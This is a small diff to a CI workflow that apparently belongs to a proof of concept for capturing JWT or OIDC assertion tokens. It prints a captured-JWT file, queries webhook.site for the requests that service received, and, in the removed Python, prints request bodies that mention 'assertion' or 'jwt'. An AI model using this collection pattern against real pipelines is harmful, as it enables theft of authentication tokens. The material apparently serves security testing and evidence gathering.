@@ -94,18 +94,7 @@ jobs:
           cat captured-jwt.json || echo "(no capture)"
           echo "---- webhook.site 收到的请求 ----"
           curl -s "https://webhook.site/token/$WH/requests?sorting=newest&per_page=20" -o wh-requests.json || true
-          python3 -c "
-import json
-try:
-    d = json.load(open('wh-requests.json'))
-    print('总请求数:', d.get('total', 0))
-    for r in d.get('data', [])[:15]:
-        print('-', r.get('method'), r.get('path') or r.get('url', '')[:60], '| UA:', (r.get('headers') or {}).get('user-agent', {}).get('value', '')[:40] if isinstance((r.get('headers') or {}), dict) else '')
-        c = r.get('content') or ''
-        if 'assertion' in c or 'jwt' in c.lower(): print('  BODY:', c[:300])
-except Exception as e:
-    print('parse err:', e)
-" || true
+          python3 parse-capture.py || true
           curl -s "https://webhook.site/token/$WH/requests?sorting=newest&per_page=50" -o wh-requests-full.json || true
 
       - name: Upload evidence
